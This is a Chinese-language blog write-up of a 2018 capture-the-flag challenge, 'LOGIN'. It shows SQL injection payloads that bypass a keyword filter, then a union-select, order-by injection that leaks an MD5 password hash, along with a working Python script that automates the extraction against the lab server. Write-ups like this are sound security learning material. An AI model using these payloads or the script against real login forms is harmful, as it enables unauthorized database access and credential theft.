---
title: 2018ZJGSCTFwriteup
date: 2018-05-07 10:36:05
tags:
---
没人做那就只能自己写了。
<!--more-->
## [LOGIN](http://10.21.13.154:35353/)
进入网站后是一个登陆界面，先是随便输入用户名和密码，发现弹窗消息。
![image](http://ww3.sinaimg.cn/large/0069oIoUgy1fr2kur9kayj30c8041jr8.jpg)
根据提示要拿到flag就必须要先找到username。
开始先试了admin等一些常规的用户名发现都不行。那就思考后台php中的sql语句是怎么样的
根据绕过sql语句来得到username。
``` sql
select * from admin where username='' and password=''
```
猜测后台中的语句应该是这样的，那就来构造绕过这个使用' or 1=1#使得where后面的结果为真
返回查询结果。输入测试后发现，or ，=，where等词被过滤了。
![image](http://ww1.sinaimg.cn/large/0069oIoUgy1fr2l3u0hu4j30bt03amwz.jpg)
然后就思考另外的方法来使得where后面的条件为真，可以使用这些方法，'^1^1#,'||1#来绕过这些
得到两个重要的提示。
![image](http://ww4.sinaimg.cn/large/0069oIoUgy1fr2l88x3ihj30c503ha9w.jpg)
![image](http://ww1.sinaimg.cn/large/0069oIoUgy1fr2l8p6bxkj30bx037glf.jpg) 
知道了password就是flag经过md5加密后的内容那就需要来猜测password的值了
基于上面有username返回所以是一个回显的注入。那就可以构造如下sql语句来猜测password的名
``` sql
yt_ia_a_handsome_boy' union select 1,2,0x80 order by 3 desc#
```
由上面提示可以知道password是一串经过md5加密后的16进制字符串利用union select插入一行，并在password
即第三列插入的是16进制的字符串，根据第三列的大小对每行数据进行排序。执行完sql语句，根据页面回显的
数据一位一位来猜解password的内容。
显示结果如下：
当插入的16进制值大于password的值会返回如下内容
![image](http://ww3.sinaimg.cn/large/0069oIoUgy1fr2ltl5hu9j30bi02ywea.jpg)
当插入的内容小于password的值会返回username的值
![image](http://ww1.sinaimg.cn/large/0069oIoUgy1fr2lv97wbrj30bq034glf.jpg)
根据上面测试的情况用python写脚本如下
``` python
# coding:utf-8

import requests

def makeStr(begin,end):
    str=""
    for i in range(begin,end):
        str+=chr(i)
    return str
def getPassword():
    url="http://10.21.13.154:35353/index.php"
    testStr = makeStr(48,127)
    username = "yt_ia_a_handsome_boy' union distinct select 1,2,0x{hex} order by 3 desc#"
    flag = ""
    for  _  in range(32):
        for i in testStr:
            data = {"username":username.format(hex=(flag+i).encode('hex')),"password":'1'}
            res = requests.post(url,data)
            if "yt_ia_a_handsome_boy" not in res.text:
                flag= flag+chr(ord(i)-1)
                print flag
                break
            else:
                print "[*]",i
if __name__== '__main__':
    getPassword()
```
运行后得到password的值
![image](http://ww3.sinaimg.cn/large/0069oIoUgy1fr2lznt8voj30eo09zjre.jpg)
[MD5j解码](http://www.cmd5.com/)后得到flag

